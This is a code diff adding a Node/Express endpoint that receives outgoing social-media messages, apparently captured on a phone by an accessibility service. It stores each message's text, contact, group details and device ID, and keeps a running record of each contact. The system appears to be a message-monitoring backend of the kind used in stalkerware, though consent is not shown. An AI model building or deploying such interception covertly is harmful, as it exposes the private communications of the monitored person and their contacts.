@@ -392,4 +392,83 @@ router.get('/:deviceId/recent', async (req, res) => {
   }
 });
 
+/**
+ * POST /api/social-media/message
+ * Upload a SENT message from accessibility service
+ */
+router.post('/message', async (req, res) => {
+  try {
+    const {
+      deviceId,
+      appPackage,
+      appName,
+      contactName,
+      contactIdentifier,
+      messageText,
+      timestamp,
+      messageType,
+      isGroupChat,
+      groupName,
+      senderInGroup,
+      mediaType
+    } = req.body;
+    
+    if (!deviceId || !appPackage || !messageText) {
+      return res.status(400).json({
+        success: false,
+        error: 'Missing required fields: deviceId, appPackage, messageText'
+      });
+    }
+    
+    // Create the message
+    const message = new SocialMessage({
+      message_id: `sent_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+      device_id: deviceId,
+      app_package: appPackage,
+      app_name: appName || APP_METADATA[appPackage]?.name || 'Unknown',
+      contact_name: contactName || 'Unknown',
+      contact_identifier: contactIdentifier || contactName || 'Unknown',
+      message_text: messageText,
+      timestamp: timestamp || Date.now(),
+      message_type: messageType || 'SENT',
+      is_group_chat: isGroupChat || false,
+      group_name: groupName,
+      sender_in_group: senderInGroup,
+      media_type: mediaType
+    });
+    
+    await message.save();
+    
+    // Update or create contact
+    await SocialContact.findOneAndUpdate(
+      {
+        device_id: deviceId,
+        app_package: appPackage,
+        contact_name: contactName || 'Unknown'
+      },
+      {
+        $set: {
+          contact_identifier: contactIdentifier || contactName || 'Unknown',
+          last_message_text: messageText,
+          last_message_time: timestamp || Date.now(),
+          last_message_type: messageType || 'SENT'
+        },
+        $inc: { message_count: 1 }
+      },
+      { upsert: true, new: true }
+    );
+    
+    console.log(`📤 SENT message saved: ${appPackage} -> ${contactName}: "${messageText.substring(0, 30)}..."`);
+    
+    res.json({
+      success: true,
+      messageId: message.message_id
+    });
+    
+  } catch (error) {
+    console.error('Error saving SENT message:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
 module.exports = router;
